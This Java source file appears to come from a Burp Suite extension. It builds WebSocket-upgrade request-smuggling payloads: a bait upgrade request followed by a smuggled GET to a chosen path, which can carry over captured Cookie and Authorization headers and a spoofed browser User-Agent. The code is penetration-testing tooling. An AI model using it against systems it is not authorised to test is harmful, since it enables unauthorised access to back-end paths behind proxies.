package burp;

import burp.api.montoya.http.message.HttpHeader;
import burp.api.montoya.http.message.requests.HttpRequest;

import java.util.ArrayList;
import java.util.Collections;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;

final class RequestTemplateBuilder {

    static final String DEFAULT_PRESERVED_HEADERS = "Host, Cookie, Authorization, Origin";

    private static final String DEFAULT_USER_AGENT =
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
            "(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36";

    private static final Set<String> PROTOCOL_CONTROLLED_HEADERS = Set.of(
            "connection",
            "upgrade",
            "sec-websocket-version",
            "sec-websocket-key",
            "content-length",
            "transfer-encoding",
            "expect"
    );

    private RequestTemplateBuilder() {}

    static String buildSmugglingRequest(HttpRequest baseRequest, String fallbackHost, int port,
                                        AttackConfig config, String payload) {
        List<HeaderLine> baseHeaders = baseRequest != null ? fromMontoyaHeaders(baseRequest.headers()) : Collections.emptyList();
        return buildSmugglingRequest(baseHeaders, fallbackHost, port, config.getBaitPath(),
                config.resolveSmugglePath(payload), config.getWsVersion(),
                config.isPreserveSelectedHeaders(), config.getPreservedHeaderNames());
    }

    static String buildSmugglingRequest(List<HeaderLine> baseHeaders, String fallbackHost, int port,
                                        String baitPath, String smuggledPath, String wsVersion,
                                        boolean preserveSelectedHeaders, String preservedHeaderNames) {
        Set<String> selectedHeaders = preserveSelectedHeaders
                ? parseHeaderNames(preservedHeaderNames)
                : Collections.emptySet();
        List<HeaderLine> selectedContext = preserveSelectedHeaders
                ? selectedContextHeaders(baseHeaders, selectedHeaders)
                : Collections.emptyList();

        String hostHeader = findPreservedHost(baseHeaders, selectedHeaders, preserveSelectedHeaders);
        if (hostHeader == null) hostHeader = fallbackHostHeader(fallbackHost, port);

        StringBuilder request = new StringBuilder();
        appendFirstRequest(request, baitPath, wsVersion, hostHeader, selectedContext);
        appendSmuggledRequest(request, smuggledPath, hostHeader, selectedContext);
        return request.toString();
    }

    static Set<String> parseHeaderNames(String rawHeaderNames) {
        if (rawHeaderNames == null || rawHeaderNames.trim().isEmpty()) return Collections.emptySet();

        Set<String> names = new LinkedHashSet<>();
        for (String token : rawHeaderNames.split(",")) {
            String name = token.trim().toLowerCase(Locale.ROOT);
            if (!name.isEmpty() && isValidHeaderName(name)) names.add(name);
        }
        return names;
    }

    private static void appendFirstRequest(StringBuilder request, String baitPath, String wsVersion,
                                           String hostHeader, List<HeaderLine> selectedContext) {
        request.append("GET ").append(baitPath).append(" HTTP/1.1\r\n");
        request.append("Host: ").append(hostHeader).append("\r\n");
        appendContextHeaders(request, selectedContext);
        request.append("Connection: Upgrade\r\n");
        request.append("Upgrade: websocket\r\n");
        request.append("Sec-WebSocket-Version: ").append(sanitizeValue(wsVersion)).append("\r\n");
        request.append("Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n");
        if (!containsHeader(selectedContext, "user-agent")) {
            request.append("User-Agent: ").append(DEFAULT_USER_AGENT).append("\r\n");
        }
        request.append("\r\n");
    }

    private static void appendSmuggledRequest(StringBuilder request, String smuggledPath,
                                              String hostHeader, List<HeaderLine> selectedContext) {
        request.append("GET ").append(smuggledPath).append(" HTTP/1.1\r\n");
        request.append("Host: ").append(hostHeader).append("\r\n");
        appendContextHeaders(request, selectedContext);
        if (!containsHeader(selectedContext, "user-agent")) {
            request.append("User-Agent: ").append(DEFAULT_USER_AGENT).append("\r\n");
        }
        request.append("\r\n");
    }

    private static List<HeaderLine> selectedContextHeaders(List<HeaderLine> baseHeaders, Set<String> selectedHeaders) {
        if (baseHeaders == null || baseHeaders.isEmpty() || selectedHeaders.isEmpty()) return Collections.emptyList();

        List<HeaderLine> selected = new ArrayList<>();
        for (HeaderLine header : baseHeaders) {
            if (header == null || header.name == null) continue;
            String normalizedName = header.name.trim().toLowerCase(Locale.ROOT);
            if ("host".equals(normalizedName)) continue;
            if (!selectedHeaders.contains(normalizedName)) continue;
            if (PROTOCOL_CONTROLLED_HEADERS.contains(normalizedName)) continue;
            if (!isValidHeaderName(header.name)) continue;

            selected.add(new HeaderLine(header.name.trim(), sanitizeValue(header.value)));
        }
        return selected;
    }

    private static void appendContextHeaders(StringBuilder request, List<HeaderLine> selectedContext) {
        for (HeaderLine header : selectedContext) {
            request.append(header.name).append(": ").append(header.value).append("\r\n");
        }
    }

    private static String findPreservedHost(List<HeaderLine> baseHeaders, Set<String> selectedHeaders,
                                            boolean preserveSelectedHeaders) {
        if (!preserveSelectedHeaders || !selectedHeaders.contains("host") || baseHeaders == null) return null;

        for (HeaderLine header : baseHeaders) {
            if (header != null && header.name != null && "host".equalsIgnoreCase(header.name.trim())) {
                return sanitizeValue(header.value);
            }
        }
        return null;
    }

    private static boolean containsHeader(List<HeaderLine> headers, String name) {
        for (HeaderLine header : headers) {
            if (header.name != null && name.equalsIgnoreCase(header.name.trim())) return true;
        }
        return false;
    }

    private static List<HeaderLine> fromMontoyaHeaders(List<HttpHeader> headers) {
        if (headers == null || headers.isEmpty()) return Collections.emptyList();

        List<HeaderLine> lines = new ArrayList<>();
        for (HttpHeader header : headers) {
            lines.add(new HeaderLine(header.name(), header.value()));
        }
        return lines;
    }

    private static String fallbackHostHeader(String host, int port) {
        if (host == null || host.isBlank()) return "";
        return host + ":" + port;
    }

    static boolean isValidHeaderName(String name) {
        return name != null && name.matches("[!#$%&'*+.^_`|~0-9A-Za-z-]+");
    }

    private static String sanitizeValue(String value) {
        if (value == null) return "";
        return value.replace("\r", "").replace("\n", "");
    }

    static class HeaderLine {
        final String name;
        final String value;

        HeaderLine(String name, String value) {
            this.name = name;
            this.value = value;
        }
    }
}
